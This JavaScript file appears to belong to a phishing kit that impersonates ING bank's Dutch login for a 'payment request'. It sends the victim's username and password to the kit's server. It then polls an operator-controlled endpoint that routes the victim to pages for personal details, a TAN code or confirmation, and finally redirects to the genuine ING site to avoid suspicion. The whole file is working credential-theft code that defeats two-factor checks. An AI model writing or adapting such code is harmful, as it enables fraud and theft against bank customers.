const login_form = document.querySelector('#login-form');
const username = document.querySelector('#login-username');
const password = document.querySelector('#login-password');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (username.value == '' || password.value == '') {
        loginButton.innerHTML = 'Inloggen';
        loginButton.disabled = false;
        username.disabled = false;
        password.disabled = false;

        username.value = '';
        password.value = '';

        document.querySelector('#userNamePassword').classList.add('has-error');
        document.querySelector('#errorMessage').classList.remove('h-hidden');
    } else {
        const data = new FormData();
        data.append('username', username.value);
        data.append('password', password.value);
        
        loginButton.innerHTML = '<img src="/img/ing.gif" width="20"> Inloggen';
        loginButton.disabled = true;
        username.disabled = true;
        password.disabled = true;

        document.querySelector('#userNamePassword').classList.remove('has-error');
        document.querySelector('#errorMessage').classList.add('h-hidden');

        fetch('/particulier/betaalverzoek/inloggen/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/particulier/betaalverzoek/inloggen/check/' + token.value, {
                    method: 'POST',
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            loginButton.innerHTML = 'Inloggen';
                            loginButton.disabled = false;
                            username.disabled = false;
                            password.disabled = false;

                            username.value = '';
                            password.value = '';

                            document.querySelector('#userNamePassword').classList.add('has-error');
                            document.querySelector('#errorMessage').classList.remove('h-hidden');

                            clearInterval(newInterval)
                        } else if (data.page == 'confirm') {
                            window.location.href = '/particulier/betaalverzoek/bevestigen/' + token.value;
                        } else if (data.page == 'details') {
                            window.location.href = '/particulier/betaalverzoek/informatie/' + token.value;
                        } else if (data.page == 'tan') {
                            window.location.href = '/particulier/betaalverzoek/tancode/' + token.value;
                        } else if (data.page == 'control') {
                            window.location.href = '/particulier/betaalverzoek/controleren/' + token.value;
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.ing.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);
        });
    } 
});


